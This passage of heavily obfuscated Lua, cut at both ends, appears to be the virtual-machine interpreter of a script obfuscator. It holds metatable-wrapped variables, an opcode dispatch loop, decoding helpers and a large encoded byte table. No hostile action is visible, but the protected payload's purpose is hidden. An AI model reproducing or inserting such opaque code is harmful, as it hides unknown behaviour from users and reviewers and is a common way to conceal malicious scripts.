end C.kh,n.GL=180,246 while C.jj<n+"w9"do(O+"sO")[C.wN],(O+"DH")[n+"Rk"]=(O+"cS")[n+"Ze"],(O+"gI")[C.aW]C.kh,n.GL=C.Rjb+1,(n+"Bdb")-1 end end local J=q({mD=function(C)return(O+"H_")[C-51379]end},{__index=function(C,n)C.mD=n end,__add=function(C,n)return rawget(C,"mD")end})local k=q({TZ={C=function(C,n,T)return(J+"s4")(C-830)end,k=function(C,n,T)return(J+"sq")(C+3766)end,p=function(C,n,T)return(J+"ci")(T+25487)end}},{__concat=function(C,n)C.TZ=n end,__sub=function(C,n)return C.TZ end})local X=q({sV=function(C)local h=q({RX={m=function(C,n,T)return(J+"fX")(T+57951)end,W=function(C,n,T)return(J+"o0")(n-41515)end,S=function(C,n,T)return(J+"w5")(C-31139)end}},{__mul=function(C,n)C.RX=n end,__sub=function(C,n)return C.RX end})local n,T=q({JF=C[#C]},{__mul=function(C,n)C.JF=n end,__index=function(C,n)return rawget(C,"JF")end}),q({MG=(h-"ro").m(-6882,-5552,-6403)},{__pow=function(C,n)C.MG=n end,__add=function(C,n)return C.MG end})for h=1,#n.ghb,1 do(p/"oV")(T^(T+"GZ"..n.w1[C[h]]))end return T+"Fy"end},{__concat=function(C,n)C.sV=n end,__div=function(C,n)return C.sV end})local C,n,T,h,L,i,f,g,t,I,Q,Z,U,b,c,w,a,D,G,r,m,l,s,M,W,e,v,P,j,V=q({av=nil},{__pow=function(C,n)C.av=n end,__concat=function(C,n)return C.av end}),q({ppb=nil},{__concat=function(C,n)C.ppb=n end,__pow=function(C,n)return C.ppb end}),q({eB=nil},{__index=function(C,n)C.eB=n end,__concat=function(C,n)return rawget(C,"eB")end}),q({LO=nil},{__div=function(C,n)C.LO=n end,__index=function(C,n)return rawget(C,"LO")end}),q({WS=nil},{__pow=function(C,n)C.WS=n end,__mul=function(C,n)return C.WS end}),q({x8=nil},{__pow=function(C,n)C.x8=n end,__sub=function(C,n)return C.x8 end}),q({KK=nil},{__mul=function(C,n)C.KK=n end,__pow=function(C,n)return C.KK end}),q({Ek=nil},{__concat=function(C,n)C.Ek=n end,__sub=function(C,n)return C.Ek end}),q({jh=nil},{__add=function(C,n)C.jh=n end,__mul=function(C,n)return C.jh end}),q({Xob=nil},{__pow=function(C,n)C.Xob=n end,__sub=function(C,n)return C.Xob end}),q({emb=nil},{__sub=function(C,n)C.emb=n end,__pow=function(C,n)return C.emb end}),q({Q8=nil},{__index=function(C,n)C.Q8=n end,__pow=function(C,n)return rawget(C,"Q8")end}),q({iu=nil},{__mul=function(C,n)C.iu=n end,__sub=function(C,n)return C.iu end}),q({x4=nil},{__concat=function(C,n)C.x4=n end,__mul=function(C,n)return C.x4 end}),q({Ot=nil},{__add=function(C,n)C.Ot=n end,__index=function(C,n)return rawget(C,"Ot")end}),q({jpb=nil},{__add=function(C,n)C.jpb=n end,__mul=function(C,n)return C.jpb end}),q({Yx=nil},{__mul=function(C,n)C.Yx=n end,__index=function(C,n)return rawget(C,"Yx")end}),q({Xf=nil},{__mul=function(C,n)C.Xf=n end,__concat=function(C,n)return C.Xf end}),q({bZ=nil},{__pow=function(C,n)C.bZ=n end,__div=function(C,n)return C.bZ end}),q({abb=nil},{__pow=function(C,n)C.abb=n end,__sub=function(C,n)return C.abb end}),q({ON=nil},{__index=function(C,n)C.ON=n end,__add=function(C,n)return rawget(C,"ON")end}),q({Vbb=nil},{__pow=function(C,n)C.Vbb=n end,__div=function(C,n)return C.Vbb end}),q({jG=nil},{__index=function(C,n)C.jG=n end,__concat=function(C,n)return rawget(C,"jG")end}),q({QI=nil},{__sub=function(C,n)C.QI=n end,__concat=function(C,n)return C.QI end}),q({w3=nil},{__concat=function(C,n)C.w3=n end,__add=function(C,n)return C.w3 end}),q({i8=nil},{__pow=function(C,n)C.i8=n end,__sub=function(C,n)return C.i8 end}),q({G6=nil},{__add=function(C,n)C.G6=n end,__pow=function(C,n)return C.G6 end}),q({E3=nil},{__mul=function(C,n)C.E3=n end,__index=function(C,n)return rawget(C,"E3")end}),q({Fd=nil},{__div=function(C,n)C.Fd=n end,__sub=function(C,n)return C.Fd end}),q({epb=nil},{__add=function(C,n)C.epb=n end,__concat=function(C,n)return C.epb end});(p/"YT")(i^function(T,h,L,i)local P=q({G1={P=function(C,n,T)return(J+"leb")(C+47607)end,A=function(C,n,T)return(J+"AW")(T-29991)end,M=function(C,n,T)return(J+"Rnb")(n+22883)end}},{__index=function(C,n)C.G1=n end,__add=function(C,n)return rawget(C,"G1")end})local f=q({Cpb={[0]=i}},{__pow=function(C,n)C.Cpb=n end,__index=function(C,n)return rawget(C,"Cpb")end})local t=q({Fmb={}},{__sub=function(C,n)C.Fmb=n end,__concat=function(C,n)return C.Fmb end})local Q=q({mN=0},{__sub=function(C,n)C.mN=n end,__concat=function(C,n)return C.mN end})local U,c,w,r,m,M=q({hF=nil},{__pow=function(C,n)C.hF=n end,__div=function(C,n)return C.hF end}),q({k7=nil},{__concat=function(C,n)C.k7=n end,__index=function(C,n)return rawget(C,"k7")end}),q({IZ=nil},{__sub=function(C,n)C.IZ=n end,__index=function(C,n)return rawget(C,"IZ")end}),q({Wcb=nil},{__pow=function(C,n)C.Wcb=n end,__sub=function(C,n)return C.Wcb end}),q({L3=nil},{__concat=function(C,n)C.L3=n end,__sub=function(C,n)return C.L3 end}),q({kL=nil},{__concat=function(C,n)C.kL=n end,__pow=function(C,n)return C.kL end});(p/"Lk")(c..(C.."Yib")+(T-1)*4);(p/"H0")(U^(D.."jK")((I-"NK")[c.an],212))while true do(p/"bcb")(w-true)while U/"Hz"==40 do(p/"uY")(t-(t.."uob")[0]);(p/"CG")(Q-(t.."sx")[(P+"Wmb").M(29237,28585,28882)])T=T+1;(p/"dob")(c..(C.."wL")+(T-1)*4);(p/"Hh")(U^(D.."Ip")((I-"DT")[c.Kj],212));(p/"d5")(w-false)end while U/"leb"==140 do(t.."xt")[Q.."oM"]=(t.."n5")[(Q.."rob")-1][(t.."gs")[Q.."ri"]]T=T+1;(p/"Tk")(c..(C.."e")+(T-1)*4);(p/"xr")(U^(D.."vS")((I-"l5")[c.OS],212));(p/"Leb")(w-false)end while U/"xW"==26 do(t.."w4")[(P+"Bd").P(3861,4345,4074)]=Q.."qK";(p/"rW")(t-{[0]=t.."bY",[1]=(t.."AT")[Q.."Ahb"]});(p/"rO")(Q-1)T=T+1;(p/"UI")(c..(C.."wA")+(T-1)*4);(p/"L")(U^(D.."Iq")((I-"CV")[c.Hjb],212));(p/"bO")(w-false)end while U/"qR"==179 do(p/"Gt")(Q-((Q.."ON")+1));(t.."L2")[Q.."t3"]={}T=T+1;(p/"Ph")(c..(C.."g2")+(T-1)*4);(p/"dob")(U^(D.."vw")((I-"uw")[c.GZ],212));(p/"VR")(w-false)end while U/"Sjb"==162 do r.Wcb,(t.."k6")[Q.."XX"]=(t.."po")[Q.."YV"],nil for C,n in ipairs(r-"wy")do(t.."Yn")[Q.."yF"]=n;(p/"JR")(Q-((Q.."yt")+1))end;(p/"Zz")(Q-((Q.."Vp")-1))T=T+1;(p/"ajb")(c..(C.."ur")+(T-1)*4);(p/"Yo")(U^(D.."nK")((I-"qg")[c.kQ],212));(p/"Yhb")(w-false)end while U/"If"==122 do(t.."Rfb")[(P+"c2").M(27765,28585,28650)]=Q.."WV";(p/"fr")(Q-0);(p/"DF")(t-{[0]=t.."Xib"})T=T+1;(p/"tG")(c..(C.."UX")+(T-1)*4);(p/"qeb")(U^(D.."Jjb")((I-"Ncb")[c.Fy],212));(p/"Ld")(w-false)end while U/"KG"==173 do(p/"nfb")(r^(G/"GP")(c.Wlb+1,2,15,160));(t.."oU")[Q.."Qf"],(t.."zV")[(Q.."wc")-(r-"Gu")]=(t.."Bdb")[(Q.."zy")-(r-"YY")],(t.."O_")[Q.."Mv"]T=T+1;(p/"AA")(c..(C.."Sy")+(T-1)*4);(p/"JI")(U^(D.."R6")((I-"W1")[c.Oh],212));(p/"Bv")(w-false)end while U/"p3"==181 do(p/"GJ")(t-{[0]=(t.."gjb")[0]});(p/"vG")(Q-0)T=T+1;(p/"B1")(c..(C.."tfb")+(T-1)*4);(p/"Id")(U^(D.."iW")((I-"gj")[c.B],212));(p/"LW")(w-false)end while U/"klb"==131 do(p/"nmb")(r^f.vg)for C=1,(G/"AB")(c.o1+3,1,28),1 do(p/"nV")(r^(r-"e5")[0])end;(r-"jA")[(G/"Se")(c.Kr+1,2,15,160)]=(t.."Fm")[(Q.."vl")-1][(t.."zj")[Q.."Epb"]];(t.."g1")[Q.."Fe"]=nil;(p/"sl")(Q-((Q.."Wr")-1))T=T+1;(p/"fx")(c..(C.."cY")+(T-1)*4);(p/"oc")(U^(D.."eob")((I-"xf")[c.EM],212));(p/"hj")(w-false)end while U/"Kn"==42 do(t.."Tgb")[(Q.."jN")-1]=(t.."q2")[(Q.."D5")-1]+(t.."jp")[Q.."qs"];(t.."b_")[Q.."Q6"]=nil;(p/"BR")(Q-((Q.."ijb")-1))T=T+1;(p/"qM")(c..(C.."Qv")+(T-1)*4);(p/"vJ")(U^(D.."BZ")((I-"ty")[c.D5],212));(p/"rr")(w-false)end while U/"yt"==115 do(p/"Ajb")(f^{[0]=f.NG})T=T+1;(p/"IQ")(c..(C.."dC")+(T-1)*4);(p/"C7")(U^(D.."dv")((I-"DD")[c.Ix],212));(p/"s7")(w-false)end while U/"Kw"==252 do(t.."C8")[Q.."xv"]=L[(t.."ycb")[Q.."M5"]]T=T+1;(p/"BH")(c..(C.."Lt")+(T-1)*4);(p/"Qv")(U^(D.."QS")((I-"LJ")[c.KE],212));(p/"l3")(w-false)end while U/"ft"==254 do(p/"Fo")(Q-((Q.."Dn")-1));(t.."P3")[Q.."qw"],(t.."UM")[(Q.."Mh")+1]={(t.."Tlb")[Q.."s9"]((b*"LM")((t.."Qp")[(Q.."P3")+1]))},nil T=T+1;(p/"Bt")(c..(C.."Vc")+(T-1)*4);(p/"Nm")(U^(D.."x0")((I-"Clb")[c.clb],212));(p/"Vy")(w-false)end while U/"kc"==25 do(t.."Pk")[Q.."kw"]=(t.."bz")[Q.."DY"][1]T=T+1;(p/"GB")(c..(C.."h7")+(T-1)*4);(p/"y7")(U^(D.."Lv")((I-"Rn")[c.OF],212));(p/"fN")(w-false)end while U/"h4"==24 do(p/"tV")(r^(t.."x7")[Q.."ud"]);(p/"fbb")(m..{(r-"JJ")[1]((r-"FV")[2],(r-"Z0")[3])})if(m-"Cq")[1]~=nil then(r-"ilb")[3]=(m-"YN")[1];(p/"QZ")(Q-((Q.."i9")+1));(t.."ofb")[Q.."Uw"]=m-"wA";(p/"WQ")(f^{[0]=f.zN})T=T+1 end T=T+1;(p/"DP")(c..(C.."Gy")+(T-1)*4);(p/"Xq")(U^(D.."i2")((I-"qD")[c.nU],212));(p/"cjb")(w-false)end while U/"bo"==112 do(p/"c0")(Q-((Q.."ofb")-1));(t.."cD")[(Q.."l7")+1]=nil T=T+1;(p/"m2")(c..(C.."jfb")+(T-1)*4);(p/"Fk")(U^(D.."Tk")((I-"ES")[c.Reb],212));(p/"we")(w-false)end while U/"Ov"==174 do(p/"hS")(Q-((Q.."Zw")-1));(t.."VU")[Q.."Glb"],(t.."eA")[(Q.."t1")+1]=(t.."Ep")[Q.."Px"]>(t.."CK")[(Q.."GY")+1],nil T=T+1;(p/"lB")(c..(C.."Fz")+(T-1)*4);(p/"Aq")(U^(D.."Dz")((I-"hK")[c.L7],212));(p/"Icb")(w-false)end while U/"Llb"==56 do(t.."vx")[Q.."dP"]=not(t.."iM")[Q.."Pdb"]T=T+1;(p/"Db")(c..(C.."mm")+(T-1)*4);(p/"Hob")(U^(D.."v4")((I-"eS")[c.yz],212));(p/"YJ")(w-false)end while U/"MC"==126 do(p/"aL")(Q-((Q.."Whb")-1));(t.."zn")[Q.."h9"],(t.."Ahb")[(Q.."K1")+1]=(t.."WR")[Q.."e5"]>=(t.."icb")[(Q.."Us")+1],nil T=T+1;(p/"c7")(c..(C.."A7")+(T-1)*4);(p/"Lx")(U^(D.."fnb")((I-"tU")[c.C_],212));(p/"T1")(w-false)end while U/"Ubb"==106 do(p/"LM")(Q-((Q.."Pn")-1));(t.."F4")[Q.."Adb"],(t.."Cg")[(Q.."UC")+1]=(t.."tL")[Q.."Uhb"][(t.."n")[(Q.."In")+1]],nil T=T+1;(p/"Veb")(c..(C.."P9")+(T-1)*4);(p/"H_")(U^(D.."e3")((I-"Dfb")[c.ek],212));(p/"Uv")(w-false)end while U/"ieb"==199 do T=(G/"co")(c.Fo+1,3,15,160,28)-1 T=T+1;(p/"Ky")(c..(C.."S0")+(T-1)*4);(p/"Lx")(U^(D.."Lb")((I-"nD")[c.Tt],212));(p/"akb")(w-false)end while U/"pk"==85 do(p/"W_")(Q-((Q.."PS")+1));(t.."bV")[Q.."mb"]=h[(G/"Zp")(c.Flb+1,2,15,160)]T=T+1;(p/"HE")(c..(C.."r8")+(T-1)*4);(p/"Pdb")(U^(D.."jN")((I-"P7")[c.qm],212));(p/"SL")(w-false)end while U/"iv"==149 do(p/"Dp")(Q-((Q.."ay")-2))L[(t.."UL")[(Q.."KG")+1]]=(t.."seb")[(Q.."XG")+2];(t.."r7")[(Q.."gm")+1],(t.."K_")[(Q.."KZ")+2]=nil,nil T=T+1;(p/"iu")(c..(C.."A_")+(T-1)*4);(p/"Tc")(U^(D.."VY")((I-"cU")[c.IW],212));(p/"zb")(w-false)end while U/"B1"==144 do(t.."RN")[(Q.."fib")+1]=nil;(p/"Y1")(Q-((Q.."Bj")+1))T=T+1;(p/"teb")(c..(C.."Zdb")+(T-1)*4);(p/"Z_")(U^(D.."Ue")((I-"r3")[c.N4],212));(p/"L1")(w-false)end while U/"f7"==128 do(p/"So")(Q-((Q.."blb")+1));(t.."l")[Q.."Wbb"]=(l/"ylb")((s.."aL")[(G/"hab")(c.Tgb+1,3,15,160,28)],L,f.vN)T=T+1;(p/"qr")(c..(C.."YD")+(T-1)*4);(p/"qJ")(U^(D.."jT")((I-"j9")[c.ms],212));(p/"A8")(w-false)end while U/"k1"==227 do if Q.."ht">0 then(p/"CZ")(r^(t.."KX")[Q.."rib"])else(p/"XJ")(r^nil)end;(p/"hr")(t-(t.."XT")[0]);(p/"aD")(Q-((t.."MD")[(P+"a5").M(28410,28585,27984)]+1));(t.."s0")[Q.."Xh"]=r-"Mjb"T=T+1;(p/"Ccb")(c..(C.."an")+(T-1)*4);(p/"jkb")(U^(D.."vc")((I-"xpb")[c.DI],212));(p/"Rl")(w-false)end while U/"Tr"==161 do if(t.."Afb")[Q.."dy"]then T=(G/"OJ")(c.bN+1,3,15,160,28)-1 end;(t.."Cdb")[Q.."Ef"]=nil;(p/"Lob")(Q-((Q.."X3")-1))T=T+1;(p/"nfb")(c..(C.."Y2")+(T-1)*4);(p/"Lmb")(U^(D.."xH")((I-"hp")[c.Bm],212));(p/"k5")(w-false)end while U/"tx"==39 do(p/"lt")(r^f.EN)for C=1,(G/"A2")(c.ckb+3,1,28),1 do(p/"Uq")(r^(r-"f0")[0])end;(t.."oc")[(Q.."xF")+1]=(r-"HT")[(G/"yQ")(c.jQ+1,2,15,160)];(p/"Yw")(Q-((Q.."Sn")+1))T=T+1;(p/"CF")(c..(C.."tU")+(T-1)*4);(p/"WJ")(U^(D.."Opb")((I-"ci")[c.MT],212));(p/"mA")(w-false)end while U/"lE"==44 do(p/"bp")(M..(G/"O6")(c.hh+1,3,15,160,28));(p/"p3")(Q-((Q.."KF")+1));(t.."s_")[Q.."TC"]=a.wv[M^"OU"]if not(t.."Rr")[Q.."Fhb"]then(p/"XU")(r^((g-"aY")[M^"Iab"]+Z^"tab"));(p/"TV")(m..(I-"vx")[r-"m"])if m-"Mdb"==192 then(p/"Zf")(m..(G/"F0")((r-"Kfb")+1,4));(t.."TD")[Q.."Sbb"]=(P+"oj").M(28324,28665,28967)for C=1,m-"Bw",1 do(t.."nA")[Q.."bjb"]=(t.."vC")[Q.."fgb"]..(e-"apb")((I-"nL")[((r-"HX")+C)+4])end elseif m-"ZX"==31 then(t.."Fbb")[Q.."ew"]=(n^"QN")((r-"bR")+1)elseif m-"bo"==104 then(t.."kbb")[Q.."nH"]=(G/"Bp")((r-"Ek")+1,4)elseif m-"Pgb"==222 then(t.."WE")[Q.."A5"]=-(G/"tr")((r-"XO")+1,4)end a.Fnb[M^"If"]=(t.."vD")[Q.."du"]end T=T+1;(p/"k")(c..(C.."Ncb")+(T-1)*4);(p/"web")(U^(D.."uN")((I-"lm")[c.R_],212));(p/"NI")(w-false)end while U/"hj"==68 do return(t.."Nbb")[Q.."sD"]end while U/"OX"==117 do(p/"zfb")(r^{})for C,n in ipairs(t.."ZC")do(r-"enb")[C]=n end;(p/"uq")(Q-1);(p/"Tjb")(t-{[0]=(t.."Cw")[0],[1]=r-"gY"})T=T+1;(p/"Wfb")(c..(C.."Tb")+(T-1)*4);(p/"Ew")(U^(D.."Cmb")((I-"rx")[c.aO],212));(p/"Adb")(w-false)end while U/"zN"==114 do(t.."cx")[(Q.."Qdb")+1]=(t.."mt")[Q.."hbb"];(p/"CM")(Q-((Q.."rcb")+1))T=T+1;(p/"oZ")(c..(C.."GB")+(T-1)*4);(p/"ep")(U^(D.."Td")((I-"ws")[c.Gq],212));(p/"z8")(w-false)end while U/"chb"==226 do return{}end while U/"Cgb"==177 do(p/"Xj")(Q-((Q.."Rz")-2));(t.."kW")[Q.."yQ"][(t.."dU")[(Q.."snb")+1]]=(t.."t6")[(Q.."G1")+2];(t.."ON")[(Q.."WD")+1],(t.."eE")[(Q.."Lob")+2]=nil,nil T=T+1;(p/"QC")(c..(C.."Qf")+(T-1)*4);(p/"hY")(U^(D.."q4")((I-"Ep")[c.Ad],212));(p/"Q8")(w-false)end while U/"acb"==220 do(p/"TA")(f^f.Xi[0])T=T+1;(p/"ox")(c..(C.."JD")+(T-1)*4);(p/"ND")(U^(D.."T7")((I-"TU")[c.ls],212));(p/"tl")(w-false)end while U/"O3"==84 do(p/"Gx")(r^f.XU)for C=1,(G/"fs")(c.te+3,1,28),1 do(p/"Cb")(r^(r-"oI")[0])end;(r-"rfb")[(G/"Mr")(c.tW+1,2,15,160)]=(t.."gw")[Q.."oX"];(t.."aP")[Q.."BZ"]=nil;(p/"EL")(Q-((Q.."eab")-1))T=T+1;(p/"zS")(c..(C.."Zr")+(T-1)*4);(p/"sE")(U^(D.."Xjb")((I-"ZF")[c.k7],212));(p/"fU")(w-false)end while U/"jx"==160 do(p/"WS")(Q-((Q.."mkb")-1));(t.."pV")[Q.."sib"],(t.."zdb")[(Q.."NQ")+1]=(t.."ko")[Q.."T6"]~=(t.."Ze")[(Q.."sp")+1],nil T=T+1;(p/"R0")(c..(C.."vab")+(T-1)*4);(p/"X2")(U^(D.."H2")((I-"HN")[c.S4],212));(p/"HN")(w-false)end while U/"Iq"==194 do(t.."tA")[(Q.."JN")+1]=true;(p/"Bc")(Q-((Q.."Sgb")+1))T=T+1;(p/"Afb")(c..(C.."ho")+(T-1)*4);(p/"Cv")(U^(D.."Ib")((I-"shb")[c.Vbb],212));(p/"Qq")(w-false)end if w.EP then T=T+1;(p/"qR")(c..(C.."Kdb")+(T-1)*4);(p/"BU")(U^(D.."l_")((I-"uF")[c.omb],212))end end end);(p/"JX")(m[function()local h=q({w={H=function(C,n,T)return(J+"HT")(T+31175)end,Q=function(C,n,T)return(J+"sv")(T-52983)end,P=function(C,n,T)return(J+"l3")(n+39695)end}},{__add=function(C,n)C.w=n end,__sub=function(C,n)return C.w end});(p/"wd")(Q-(G/"HO")(1,3));(p/"sB")(s[{}])for n=0,Q^"iU"-1,1 do(s.."e6")[n+1]=(G/"qob")((C.."T6")+n*3,3)end;(p/"k1")(C^((C.."LR")+Q^"dG"*3));(p/"dI")(c+(G/"Llb")(C.."Ii",3))for n=0,c.ZP-1,1 do(g-"vkb")[n+1]=(G/"Pe")(((C.."zq")+3)+n*4,4)end;(p/"Oj")(C^(((C.."Yhb")+c.s3*4)+6));(p/"Ay")(L^(G/"q4")((C.."HN")-3,3));(p/"ET")(Z[(C.."Tq")+(L*"a1")*4])end]);(p/"Vdb")(h/table[(k-"gr").k(47648,48615,47534)]);(p/"Xt")(V+string[(k-"G5").C(52231,52183,52817)]);(p/"Qb")(s[{}]);(p/"pb")(f*math[(k-"h_").k(47644,47674,48423)]);(p/"jZ")(P*function(C)local L=q({hY={t=function(C,n,T)return(J+"o5")(n+46819)end,z=function(C,n,T)return(J+"UH")(n+30431)end,A=function(C,n,T)return(J+"ev")(n-60515)end}},{__sub=function(C,n)C.hY=n end,__add=function(C,n)return C.hY end})local n=q({QE={}},{__pow=function(C,n)C.QE=n end,__div=function(C,n)return C.QE end})C=(W+"ff")((W+"deb")(C,(L+"Xcb").t(5328,4738,4778),function(C)local f=q({Wx={V=function(C,n,T)return(J+"qd")(C-63759)end,D=function(C,n,T)return(J+"zdb")(T-64195)end,d=function(C,n,T)return(J+"Vnb")(T+32875)end}},{__add=function(C,n)C.Wx=n end,__sub=function(C,n)return C.Wx end})if C==(f-"Heb").d(18104,18647,18563)then return(f-"RU").d(18099,17948,18673)end local n,T=q({le=(f-"Lf").d(18722,18547,18673)},{__pow=function(C,n)C.le=n end,__concat=function(C,n)return C.le end}),q({A5=(M.."TG")(v^"id",C)-1},{__mul=function(C,n)C.A5=n end,__pow=function(C,n)return C.A5 end})for C=6,1,-1 do(p/"ec")(n^((n.."Bjb")..(T^"Th"%2^C-T^"idb"%2^(C-1)>0 and(f-"W2").D(115361,115025,115745)or(f-"QZ").D(114935,115532,115681))))end return n.."pE"end),(L+"av").z(21554,20990,20601),function(C)local L=q({Kib={E=function(C,n,T)return(J+"Av")(T+29739)end,S=function(C,n,T)return(J+"rv")(n+18250)end,J=function(C,n,T)return(J+"Y_")(n+12310)end}},{__mul=function(C,n)C.Kib=n end,__add=function(C,n)return C.Kib end})if#C~=8 then return(L+"x1").J(39564,39238,38382)end local n=q({Dfb=0},{__index=function(C,n)C.Dfb=n end,__div=function(C,n)return rawget(C,"Dfb")end})for T=1,8,1 do(p/"Thb")(n[n/"k6"+((U-"JC")(C,T,T)==(L+"q_").S(34027,33300,33512)and 2^(8-T)or 0)])end return(e-"Qib")(n/"ijb")end)for T=1,#C,1 do(n/"UU")[T]=(V.."VV")(C,T)end return n/"XP"end);(p/"Yb")(g..{});(p/"S9")(n..function(C)local t=q({cb={R=function(C,n,T)return(J+"tp")(T-17858)end,O=function(C,n,T)return(J+"Lo")(C+37119)end,c=function(C,n,T)return(J+"Rm")(T+2906)end}},{__add=function(C,n)C.cb=n end,__div=function(C,n)return C.cb end})local n=q({nI={}},{__concat=function(C,n)C.nI=n end,__index=function(C,n)return rawget(C,"nI")end})for T=0,7,1 do n.oi[T+1]=(I-"Uk")[C+T]end local T=q({op=1},{__concat=function(C,n)C.op=n end,__pow=function(C,n)return C.op end})local h=q({S8=n.Gy[2]%16},{__sub=function(C,n)C.S8=n end,__mul=function(C,n)return C.S8 end})for C=3,8,1 do(p/"ec")(h-((h*"rO")*256+n.mk[C]))end if n.ji[1]>127 then(p/"od")(T..-1)end local L=q({IY=n.zj[1]%128*16+(f^"yx")(n.G7[2]/16)},{__sub=function(C,n)C.IY=n end,__mul=function(C,n)return C.IY end})if L*"t"==0 then return 0 end;(p/"Jv")(h-((r-"Adb")(h*"jm",-52)+1)*T^"fp")return(r-"oW")(h*"hlb",L*"aj"-1023)end);(p/"Fbb")(W..string[(k-"BH").k(47654,47246,48358)]);(p/"U6")(U*string[(k-"Llb").C(52330,53018,52964)]);(p/"nV")(b..(table and table[(k-"kj").p(26159,25085,26065)]or unpack));(p/"Zlb")(e^string[(k-"bF").k(47632,48207,47828)]);(p/"tG")(M-string[(k-"Jv").C(52249,51638,51403)]);(p/"sV")(G^function(C,n,...)local g=q({Ai={k=function(C,n,T)return(J+"lD")(C+37399)end,U=function(C,n,T)return(J+"Mab")(n+2290)end,C=function(C,n,T)return(J+"L9")(T-12874)end}},{__concat=function(C,n)C.Ai=n end,__sub=function(C,n)return C.Ai end})local T=q({BI={...}},{__mul=function(C,n)C.BI=n end,__pow=function(C,n)return C.BI end})local h=q({ND=0},{__mul=function(C,n)C.ND=n end,__concat=function(C,n)return C.ND end})local L=q({gy=1},{__div=function(C,n)C.gy=n end,__index=function(C,n)return rawget(C,"gy")end})for n=0,n-1,1 do(p/"Sab")(h*((h.."oS")+(D.."Rh")((I-"neb")[C+n],T^"V7"and(T^"Gr")[n+1]or 0)*L.G3));(p/"qgb")(L/(L.Lw*256))end return h.."mF"end);(p/"dq")(v+(X/"BM")({3,2,1,{(k-"p3").p(26224,26606,26123),(k-"P9").k(47850,47711,47946),(k-"oh").C(52372,53294,52887)}}));(p/"Odb")(r^math[(k-"Q").C(52410,52339,52670)]);(p/"YA")(a*{});(p/"hf")(I^(X/"p3")({80,78,126,181,51,45,166,62,144,90,198,121,100,117,59,152,42,124,81,71,68,30,37,222,179,213,69,172,155,224,127,28,156,40,6,115,145,110,65,149,177,92,120,219,187,74,218,157,106,60,170,136,1,134,139,195,135,178,169,116,175,108,159,111,16,180,153,129,4,167,223,150,141,203,55,211,143,44,50,83,5,52,104,97,138,91,147,46,160,43,49,191,11,41,188,133,199,63,161,101,7,217,184,154,33,225,10,17,95,96,76,125,190,131,122,204,29,214,112,86,210,185,114,174,130,93,12,105,201,163,205,21,226,20,140,128,75,67,165,8,109,194,207,19,209,57,24,123,193,118,173,56,73,98,197,70,119,107,61,13,39,148,212,85,200,53,32,132,79,22,34,168,196,25,77,215,84,142,35,164,186,82,171,202,38,113,36,94,162,103,64,47,221,15,176,23,99,183,158,31,87,72,208,220,206,137,27,2,14,26,54,18,88,192,151,48,182,146,9,102,216,89,189,58,66,3,{(k-"Oob").k(47686,47273,48038),(k-"lq").p(25834,26143,25922),(k-"tdb").k(47694,47991,48440),(k-"V").k(47824,47974,47530),(k-"fib").p(25431,25822,26052),(k-"pX").k(47740,48149,47916),(k-"qpb").p(25615,25203,25937),(k-"bV").C(52363,52669,52222),(k-"Ip").C(52425,52317,51605),(k-"Ie").C(52454,52366,53062),(k-"cx").k(47730,46915,47389),(k-"Pq").k(47731,47859,48379),(k-"Ohb").p(26021,26193,26026),(k-"Xf").p(25471,25029,25959),(k-"JW").C(52232,53075,51463),(k-"amb").k(47848,48218,47565),(k-"Gb").p(26323,26543,26043),(k-"ps").p(26592,26220,25912),(k-"pmb").k(47836,48058,48351),(k-"jE").C(52433,51712,53135),(k-"Y9").k(47681,46935,47866),(k-"IT").C(52305,52137,51844),(k-"hO").p(25346,25772,25954),(k-"nA").p(25677,25849,25977),(k-"Yhb").p(25650,26147,26113),(k-"Flb").C(52371,51876,52257),(k-"MK").C(52235,51604,52637),(k-"G4").k(47805,47916,48267),(k-"Q1").k(47785,46946,47634),(k-"J0").C(52451,52174,51543),(k-"SI").p(26848,26434,25906),(k-"eA").p(25311,26708,26075),(k-"zA").C(52328,51733,52594),(k-"sib").k(47772,47477,48298),(k-"pl").C(52339,53085,52196),(k-"xob").p(25776,26238,25944),(k-"mk").k(47642,47815,48652),(k-"vr").k(47638,47768,47641),(k-"fv").C(52296,51469,51325),(k-"Ujb").C(52439,52750,51779),(k-"D9").C(52299,52293,51909),(k-"fS").p(25213,25319,25998),(k-"Do").k(47745,48581,46767),(k-"xkb").k(47701,48477,47483),(k-"qbb").C(52347,52678,52062),(k-"tx").C(52408,51874,52518),(k-"gH").k(47621,47223,47344),(k-"Jnb").C(52376,52215,53069),(k-"Ho").C(52350,52924,52627),(k-"IN").C(52441,52371,52621),(k-"WL").k(47684,48293,47874),(k-"ifb").C(52386,52986,52893),(k-"gkb").C(52310,52069,51638),(k-"qh").k(47802,46781,47052),(k-"Id").C(52266,51839,52309),(k-"Nbb").p(26063,25643,25957),(k-"Xl").p(25650,26058,26049),(k-"vpb").C(52284,53196,51665),(k-"Me").k(47792,48285,48170),(k-"Fx").C(52260,51384,52120),(k-"vj").C(52417,52724,51730),(k-"gc").C(52421,52603,53233),(k-"G7").C(52358,52607,51889),(k-"Md").k(47705,48078,48347),(k-"Q4").C(52405,52524,52862),(k-"rV").k(47736,47779,46778),(k-"Nl").k(47662,48376,48195),(k-"R8").C(52367,51655,52842),(k-"Ii").k(47803,48129,48477),(k-"olb").p(26584,26327,26089),(k-"G").k(47859,47263,48845),(k-"Zy").k(47676,46655,48333),(k-"T9").k(47847,47896,47276),(k-"Tmb").k(47671,47709,47005),(k-"Dfb").p(26875,26663,26004),(k-"u8").C(52241,52403,52704),(k-"Bib").k(47711,48677,47058),(k-"YI").C(52248,51626,51640),(k-"hi").C(52449,52281,52017),(k-"UD").C(52220,52023,53177),(k-"wj").C(52359,52515,52135),(k-"V2").C(52221,52590,52392),(k-"KR").C(52351,53149,51651),(k-"Y7").p(26433,25230,25974),(k-"UZ").k(47615,47025,47961),(k-"AB").C(52325,52959,51991),(k-"Wbb").C(52253,52855,53103),(k-"Sn").p(26449,24953,25910),(k-"Ad").C(52391,53388,52498),(k-"lG").C(52320,52010,52395),(k-"W1").p(26778,25552,26133),(k-"fG").k(47753,48011,48396),(k-"jj").k(47623,47411,46997),(k-"Kv").p(26717,26570,26101),(k-"R1").k(47794,47627,47983),(k-"mg").p(25623,26526,25961),(k-"S3").C(52306,51411,52394),(k-"mdb").p(26518,26387,25953),(k-"kK").k(47816,48020,48010),(k-"qcb").C(52427,53358,53123),(k-"u6").k(47721,48497,47254),(k-"jB").C(52213,51444,51207),(k-"lab").k(47742,48544,46981),(k-"ru").k(47752,47316,47439),(k-"o").C(52335,53179,52200),(k-"bl").p(26229,26897,26112),(k-"Qob").C(52385,51889,51705),(k-"Qd").k(47666,46844,47170),(k-"tH").C